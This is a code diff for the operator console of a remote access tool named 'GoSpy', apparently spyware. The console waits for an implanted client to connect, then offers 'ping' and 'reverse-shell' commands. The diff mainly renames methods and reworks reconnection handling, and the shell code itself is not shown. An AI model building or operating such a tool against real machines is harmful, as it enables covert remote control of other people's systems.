@@ -26,27 +26,31 @@ func executor(spyClient *client.GoSpyClient, in string) {
 	var err error // So the it can be inspected after the switch.
 
 	switch blocks[0] {
+
 	case "exit":
 		os.Exit(0)
+
 	case "ping":
 		var resp string
-		resp, err = spyClient.Ping()
+		resp, err = spyClient.CommandPing()
 		if err != nil {
-			fmt.Printf("Ping error: %s\n", err.Error())
+			fmt.Printf("CommandPing error: %s\n", err.Error())
 			break
 		}
 		fmt.Printf("Recv: %s\n", resp)
+
 	case "reverse-shell":
-		err = spyClient.EnterReverseShellRepl()
+		err = spyClient.CommandReverseShell()
 		if err != nil {
 			fmt.Printf("Reverse shell error: %s\n", err.Error())
 		}
+
 	}
 
 	if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
 		fmt.Println("\nNetwork error detected, dropping client and waiting for reconnect...")
-		_ = spyClient.CloseConn()
-		_ = spyClient.WaitForConn()
+		_ = spyClient.Close()
+		spyClient.WaitForClient()
 		fmt.Println("Successful reconnect from client")
 	}
 }
@@ -66,10 +70,9 @@ func main() {
 
 	fmt.Println("Waiting for connection from GoSpy client...")
 
-	spyClient := client.NewGoSpyClient(*bindAddr, *password)
-	err := spyClient.WaitForConn()
+	spyClient, err := client.NewGoSpyClient(*bindAddr, *password)
 	if err != nil {
-		fmt.Printf("Error listening on given address: %s\n", err.Error())
+		fmt.Printf("Error listening for client: %s\n", err.Error())
 		os.Exit(1)
 	}
 
